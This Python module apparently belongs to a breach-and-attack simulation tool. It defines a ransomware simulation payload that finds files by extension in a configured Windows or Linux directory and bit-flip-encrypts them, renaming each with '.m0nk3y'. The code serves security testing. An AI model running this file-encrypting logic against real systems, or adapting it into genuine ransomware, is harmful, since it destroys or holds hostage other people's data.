import logging
from pathlib import Path

from infection_monkey.ransomware.ransomware_bitflip_encryptor import RansomwareBitflipEncryptor
from infection_monkey.ransomware.valid_file_extensions import VALID_FILE_EXTENSIONS_FOR_ENCRYPTION
from infection_monkey.utils.dir_utils import (
    file_extension_filter,
    filter_files,
    get_all_regular_files_in_directory,
    is_not_shortcut_filter,
    is_not_symlink_filter,
)
from infection_monkey.utils.environment import is_windows_os

LOG = logging.getLogger(__name__)

EXTENSION = ".m0nk3y"


class RansomewarePayload:
    def __init__(self, config: dict):
        LOG.info(f"Windows dir configured for encryption is \"{config['windows_dir']}\"")
        LOG.info(f"Linux dir configured for encryption is \"{config['linux_dir']}\"")

        self._target_dir = config["windows_dir"] if is_windows_os() else config["linux_dir"]
        self._valid_file_extensions_for_encryption = VALID_FILE_EXTENSIONS_FOR_ENCRYPTION.copy()
        self._valid_file_extensions_for_encryption.discard(EXTENSION)
        self._encryptor = RansomwareBitflipEncryptor(EXTENSION)

    def run_payload(self):
        file_list = self._find_files()
        self._encryptor.encrypt_files(file_list)

    def _find_files(self):
        if not self._target_dir:
            return []

        file_filters = [
            file_extension_filter(self._valid_file_extensions_for_encryption),
            is_not_shortcut_filter,
            is_not_symlink_filter,
        ]

        all_files = get_all_regular_files_in_directory(Path(self._target_dir))
        return filter_files(all_files, file_filters)
